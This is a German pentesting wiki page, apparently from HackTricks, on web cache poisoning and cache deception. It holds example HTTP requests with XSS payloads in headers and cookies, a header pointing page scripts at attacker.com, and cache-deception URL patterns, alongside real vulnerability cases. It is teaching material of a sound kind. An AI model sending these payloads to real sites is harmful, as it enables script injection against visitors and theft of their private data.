# Cache Poisoning und Cache Deception

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Nutze [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=cache-deception), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Erhalte heute Zugang:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

## Der Unterschied

> **Was ist der Unterschied zwischen Web-Cache-Poisoning und Web-Cache-Deception?**
>
> * Bei **Web-Cache-Poisoning** verursacht der Angreifer, dass die Anwendung sch√§dliche Inhalte im Cache speichert, und diese Inhalte werden aus dem Cache an andere Anwendungsbenutzer ausgeliefert.
> * Bei **Web-Cache-Deception** verursacht der Angreifer, dass die Anwendung sensible Inhalte eines anderen Benutzers im Cache speichert, und der Angreifer ruft dann diese Inhalte aus dem Cache ab.

## Cache Poisoning

Cache-Poisoning zielt darauf ab, den Client-seitigen Cache zu manipulieren, um Clients dazu zu bringen, Ressourcen zu laden, die unerwartet, teilweise oder unter der Kontrolle eines Angreifers stehen. Das Ausma√ü der Auswirkungen h√§ngt von der Popularit√§t der betroffenen Seite ab, da die kontaminierte Antwort ausschlie√ülich an Benutzer ausgeliefert wird, die die Seite w√§hrend der Cache-Kontamination besuchen.

Die Durchf√ºhrung eines Cache-Poisoning-Angriffs umfasst mehrere Schritte:

1. **Identifizierung von Unschl√ºsselbaren Eingaben**: Dies sind Parameter, die, obwohl sie nicht erforderlich sind, damit eine Anfrage im Cache gespeichert wird, die Antwort des Servers √§ndern k√∂nnen. Die Identifizierung dieser Eingaben ist entscheidend, da sie ausgenutzt werden k√∂nnen, um den Cache zu manipulieren.
2. **Ausnutzung der Unschl√ºsselbaren Eingaben**: Nach der Identifizierung der unschl√ºsselbaren Eingaben besteht der n√§chste Schritt darin, herauszufinden, wie man diese Parameter missbrauchen kann, um die Antwort des Servers in einer Weise zu √§ndern, die dem Angreifer zugutekommt.
3. **Sicherstellen, dass die vergiftete Antwort im Cache gespeichert wird**: Der letzte Schritt besteht darin, sicherzustellen, dass die manipulierte Antwort im Cache gespeichert wird. Auf diese Weise erh√§lt jeder Benutzer, der die betroffene Seite besucht, w√§hrend der Cache vergiftet ist, die kontaminierte Antwort.

### Entdeckung: √úberpr√ºfen der HTTP-Header

Normalerweise gibt es, wenn eine Antwort **im Cache gespeichert wurde**, einen **Header, der dies anzeigt**. Du kannst √ºberpr√ºfen, auf welche Header du in diesem Beitrag achten solltest: [**HTTP-Cache-Header**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Entdeckung: Caching-Fehlercodes

Wenn du denkst, dass die Antwort im Cache gespeichert wird, k√∂nntest du versuchen, **Anfragen mit einem fehlerhaften Header zu senden**, auf die mit einem **Statuscode 400** geantwortet werden sollte. Versuche dann, die Anfrage normal zuzugreifen, und wenn die **Antwort ein 400-Statuscode ist**, wei√üt du, dass es anf√§llig ist (und du k√∂nntest sogar einen DoS durchf√ºhren).

Du kannst weitere Optionen in finden:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

Beachte jedoch, dass **manchmal diese Arten von Statuscodes nicht im Cache gespeichert werden**, sodass dieser Test m√∂glicherweise nicht zuverl√§ssig ist.

### Entdeckung: Identifizieren und Bewerten von unschl√ºsselbaren Eingaben

Du k√∂nntest [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) verwenden, um **Parameter und Header zu bruteforcen**, die m√∂glicherweise **die Antwort der Seite √§ndern**. Zum Beispiel k√∂nnte eine Seite den Header `X-Forwarded-For` verwenden, um dem Client anzuzeigen, dass das Skript von dort geladen werden soll:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Elicit a harmful response from the back-end server

Mit dem identifizierten Parameter/Header √ºberpr√ºfen, wie er **bereinigt** wird und **wo** er **reflektiert** wird oder die Antwort aus dem Header beeinflusst. Kannst du es irgendwie ausnutzen (eine XSS durchf√ºhren oder einen von dir kontrollierten JS-Code laden? einen DoS durchf√ºhren?...)

### Get the response cached

Sobald du die **Seite** identifiziert hast, die ausgenutzt werden kann, welchen **Parameter**/**Header** du verwenden und **wie** du ihn **ausnutzen** kannst, musst du die Seite im Cache speichern. Je nach Ressource, die du im Cache speichern m√∂chtest, kann dies einige Zeit in Anspruch nehmen; du musst m√∂glicherweise mehrere Sekunden lang versuchen.

Der Header **`X-Cache`** in der Antwort k√∂nnte sehr n√ºtzlich sein, da er den Wert **`miss`** haben kann, wenn die Anfrage nicht im Cache gespeichert wurde, und den Wert **`hit`**, wenn sie im Cache gespeichert ist.\
Der Header **`Cache-Control`** ist ebenfalls interessant, um zu wissen, ob eine Ressource im Cache gespeichert wird und wann die Ressource das n√§chste Mal wieder im Cache gespeichert wird: `Cache-Control: public, max-age=1800`

Ein weiterer interessanter Header ist **`Vary`**. Dieser Header wird h√§ufig verwendet, um **zus√§tzliche Header** anzugeben, die als **Teil des Cache-Schl√ºssels** behandelt werden, auch wenn sie normalerweise nicht als Schl√ºssel verwendet werden. Daher kann der Benutzer, wenn er den `User-Agent` des Opfers kennt, das er anvisiert, den Cache f√ºr die Benutzer mit diesem spezifischen `User-Agent` vergiften.

Ein weiterer Header, der mit dem Cache zusammenh√§ngt, ist **`Age`**. Er definiert die Zeit in Sekunden, die das Objekt im Proxy-Cache war.

Beim Caching einer Anfrage sei **vorsichtig mit den Headern, die du verwendest**, da einige von ihnen **unerwartet** als **schl√ºsselig** verwendet werden k√∂nnten und das **Opfer diesen gleichen Header verwenden muss**. Immer **testen** einer Cache-Vergiftung mit **verschiedenen Browsern**, um zu √ºberpr√ºfen, ob es funktioniert.

## Exploiting Examples

### Easiest example

Ein Header wie `X-Forwarded-For` wird unsanitized in der Antwort reflektiert.\
Du kannst eine grundlegende XSS-Payload senden und den Cache vergiften, sodass jeder, der auf die Seite zugreift, XSSed wird:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Cache-Poisoning f√ºr DoS

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Verwendung von Web-Cache-Poisoning zur Ausnutzung von Cookie-Verwundbarkeiten

Cookies k√∂nnten auch in der Antwort einer Seite reflektiert werden. Wenn Sie dies missbrauchen k√∂nnen, um beispielsweise ein XSS zu verursachen, k√∂nnten Sie in der Lage sein, XSS in mehreren Clients auszunutzen, die die b√∂sartige Cache-Antwort laden.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Beachten Sie, dass, wenn das verwundbare Cookie von den Benutzern h√§ufig verwendet wird, regelm√§√üige Anfragen den Cache bereinigen.

### Generierung von Abweichungen mit Trennzeichen, Normalisierung und Punkten <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

√úberpr√ºfen Sie:

{% content-ref url="cache-poisoning-via-url-discrepancies.md" %}
[cache-poisoning-via-url-discrepancies.md](cache-poisoning-via-url-discrepancies.md)
{% endcontent-ref %}

### Cache-Vergiftung mit Pfadtraversierung zum Stehlen des API-Schl√ºssels <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Dieser Bericht erkl√§rt**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html), wie es m√∂glich war, einen OpenAI API-Schl√ºssel mit einer URL wie `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` zu stehlen, da alles, was mit `/share/*` √ºbereinstimmt, ohne dass Cloudflare die URL normalisiert, im Cache gespeichert wird, was geschah, als die Anfrage den Webserver erreichte.

Dies wird auch besser erkl√§rt in:

{% content-ref url="cache-poisoning-via-url-discrepancies.md" %}
[cache-poisoning-via-url-discrepancies.md](cache-poisoning-via-url-discrepancies.md)
{% endcontent-ref %}

### Verwendung mehrerer Header zur Ausnutzung von Web-Cache-Vergiftungsanf√§lligkeiten <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Manchmal m√ºssen Sie **mehrere unverschl√ºsselte Eingaben ausnutzen**, um einen Cache zu missbrauchen. Zum Beispiel k√∂nnen Sie einen **Open Redirect** finden, wenn Sie `X-Forwarded-Host` auf eine von Ihnen kontrollierte Domain und `X-Forwarded-Scheme` auf `http` setzen. **Wenn** der **Server** alle **HTTP**-Anfragen **an HTTPS** weiterleitet und den Header `X-Forwarded-Scheme` als Domainnamen f√ºr die Weiterleitung verwendet. Sie k√∂nnen steuern, wohin die Seite durch die Weiterleitung zeigt.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Ausnutzen des begrenzten `Vary`-Headers

Wenn Sie festgestellt haben, dass der **`X-Host`**-Header als **Domainname zum Laden einer JS-Ressource** verwendet wird, der **`Vary`**-Header in der Antwort jedoch **`User-Agent`** angibt, m√ºssen Sie einen Weg finden, den User-Agent des Opfers zu exfiltrieren und den Cache mit diesem User-Agent zu vergiften:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Senden Sie eine GET-Anfrage mit der Anfrage in der URL und im Body. Wenn der Webserver den aus dem Body verwendet, der Cache-Server jedoch den aus der URL cached, wird jeder, der auf diese URL zugreift, tats√§chlich den Parameter aus dem Body verwenden. Wie die Schwachstelle, die James Kettle auf der Github-Website gefunden hat:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Zum Beispiel ist es m√∂glich, **Parameter** in Ruby-Servern mit dem Zeichen **`;`** anstelle von **`&`** zu trennen. Dies k√∂nnte verwendet werden, um unverschl√ºsselte Parameterwerte in verschl√ºsselten zu platzieren und sie auszunutzen.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Erfahren Sie hier, wie man [Cache Poisoning-Angriffe durch Ausnutzung von HTTP Request Smuggling](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning) durchf√ºhrt.

### Automated testing for Web Cache Poisoning

Der [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) kann verwendet werden, um automatisch nach Web-Cache-Poisoning zu testen. Er unterst√ºtzt viele verschiedene Techniken und ist hochgradig anpassbar.

Beispielverwendung: `wcvs -u example.com`

## Vulnerable Examples

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS leitete den Fragmentteil innerhalb der URL weiter, ohne ihn zu entfernen, und generierte den Cache-Schl√ºssel nur unter Verwendung des Hosts, des Pfads und der Abfrage (das Fragment ignorierend). Daher wurde die Anfrage `/#/../?r=javascript:alert(1)` an das Backend als `/#/../?r=javascript:alert(1)` gesendet, und der Cache-Schl√ºssel hatte die Payload nicht darin, nur Host, Pfad und Abfrage.

### GitHub CP-DoS

Das Senden eines fehlerhaften Wertes im Content-Type-Header l√∂ste eine 405-Cache-Antwort aus. Der Cache-Schl√ºssel enthielt das Cookie, sodass es nur m√∂glich war, nicht authentifizierte Benutzer anzugreifen.

### GitLab + GCP CP-DoS

GitLab verwendet GCP-Buckets zur Speicherung statischer Inhalte. **GCP Buckets** unterst√ºtzen den **Header `x-http-method-override`**. Daher war es m√∂glich, den Header `x-http-method-override: HEAD` zu senden und den Cache so zu vergiften, dass er einen leeren Antwortk√∂rper zur√ºckgibt. Es k√∂nnte auch die Methode `PURGE` unterst√ºtzen.

### Rack Middleware (Ruby on Rails)

In Ruby on Rails-Anwendungen wird h√§ufig Rack-Middleware verwendet. Der Zweck des Rack-Codes besteht darin, den Wert des **`x-forwarded-scheme`**-Headers zu √ºbernehmen und ihn als Schema der Anfrage festzulegen. Wenn der Header `x-forwarded-scheme: http` gesendet wird, erfolgt eine 301-Weiterleitung an denselben Ort, was m√∂glicherweise zu einer Denial of Service (DoS) f√ºr diese Ressource f√ºhrt. Dar√ºber hinaus k√∂nnte die Anwendung den `X-forwarded-host`-Header anerkennen und Benutzer an den angegebenen Host umleiten. Dieses Verhalten kann dazu f√ºhren, dass JavaScript-Dateien von einem Server des Angreifers geladen werden, was ein Sicherheitsrisiko darstellt.

### 403 and Storage Buckets

Cloudflare hat zuvor 403-Antworten zwischengespeichert. Der Versuch, auf S3 oder Azure Storage Blobs mit falschen Autorisierungsheadern zuzugreifen, f√ºhrte zu einer 403-Antwort, die zwischengespeichert wurde. Obwohl Cloudflare das Zwischenspeichern von 403-Antworten eingestellt hat, k√∂nnte dieses Verhalten weiterhin in anderen Proxy-Diensten vorhanden sein.

### Injecting Keyed Parameters

Caches enthalten h√§ufig spezifische GET-Parameter im Cache-Schl√ºssel. Zum Beispiel speicherte Fastlys Varnish den `size`-Parameter in Anfragen. Wenn jedoch eine URL-kodierte Version des Parameters (z. B. `siz%65`) auch mit einem fehlerhaften Wert gesendet wurde, wurde der Cache-Schl√ºssel unter Verwendung des korrekten `size`-Parameters konstruiert. Das Backend w√ºrde jedoch den Wert im URL-kodierten Parameter verarbeiten. Die URL-Kodierung des zweiten `size`-Parameters f√ºhrte zu dessen Auslassung durch den Cache, aber zu seiner Verwendung durch das Backend. Das Zuweisen eines Wertes von 0 zu diesem Parameter f√ºhrte zu einem zwischenspeicherbaren 400 Bad Request-Fehler.

### User Agent Rules

Einige Entwickler blockieren Anfragen mit User-Agents, die mit denen von stark frequentierten Tools wie FFUF oder Nuclei √ºbereinstimmen, um die Serverlast zu verwalten. Ironischerweise kann dieser Ansatz Schwachstellen wie Cache Poisoning und DoS einf√ºhren.

### Illegal Header Fields

Die [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) spezifiziert die akzeptablen Zeichen in Headernamen. Header, die Zeichen au√üerhalb des angegebenen **tchar**-Bereichs enthalten, sollten idealerweise eine 400 Bad Request-Antwort ausl√∂sen. In der Praxis halten sich Server jedoch nicht immer an diesen Standard. Ein bemerkenswertes Beispiel ist Akamai, das Header mit ung√ºltigen Zeichen weiterleitet und jeden 400-Fehler zwischenspeichert, solange der `cache-control`-Header nicht vorhanden ist. Ein ausnutzbares Muster wurde identifiziert, bei dem das Senden eines Headers mit einem illegalen Zeichen, wie `\`, zu einem zwischenspeicherbaren 400 Bad Request-Fehler f√ºhrte.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

Das Ziel der Cache Deception ist es, dass Clients **Ressourcen laden, die mit ihren sensiblen Informationen vom Cache gespeichert werden**.

Zun√§chst ist zu beachten, dass **Erweiterungen** wie `.css`, `.js`, `.png` usw. normalerweise **konfiguriert** sind, um im **Cache gespeichert** zu werden. Daher wird der Cache wahrscheinlich die Antwort speichern, wenn Sie auf `www.example.com/profile.php/nonexistent.js` zugreifen, da er die `.js` **Erweiterung** sieht. Wenn die **Anwendung** jedoch mit den **sensiblen** Benutzerinhalten, die in _www.example.com/profile.php_ gespeichert sind, **wiedergibt**, k√∂nnen Sie diese Inhalte von anderen Benutzern **stehlen**.

Weitere Dinge, die getestet werden sollten:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Verwenden Sie weniger bekannte Erweiterungen wie_ `.avif`

Ein weiteres sehr klares Beispiel finden Sie in diesem Bericht: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
In dem Beispiel wird erkl√§rt, dass, wenn Sie eine nicht vorhandene Seite wie _http://www.example.com/home.php/non-existent.css_ laden, der Inhalt von _http://www.example.com/home.php_ (**mit den sensiblen Informationen des Benutzers**) zur√ºckgegeben wird und der Cache-Server das Ergebnis speichern wird.\
Dann kann der **Angreifer** _http://www.example.com/home.php/non-existent.css_ in seinem eigenen Browser aufrufen und die **vertraulichen Informationen** der Benutzer beobachten, die zuvor darauf zugegriffen haben.

Beachten Sie, dass der **Cache-Proxy** so **konfiguriert** sein sollte, dass er Dateien **basierend** auf der **Erweiterung** der Datei (_ .css_) und nicht basierend auf dem Content-Type zwischenspeichert. Im Beispiel _http://www.example.com/home.php/non-existent.css_ wird ein `text/html`-Content-Type anstelle eines `text/css`-Mime-Typs (der f√ºr eine _.css_-Datei erwartet wird) haben.

Erfahren Sie hier, wie man [Cache Deceptions-Angriffe durch Ausnutzung von HTTP Request Smuggling](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception) durchf√ºhrt.

## Automatic Tools

* [**toxicache**](https://github.com/xhzeem/toxicache): Golang-Scanner, um Web-Cache-Poisoning-Schwachstellen in einer Liste von URLs zu finden und mehrere Injektionstechniken zu testen.

## References

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=cache-deception), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugriff heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
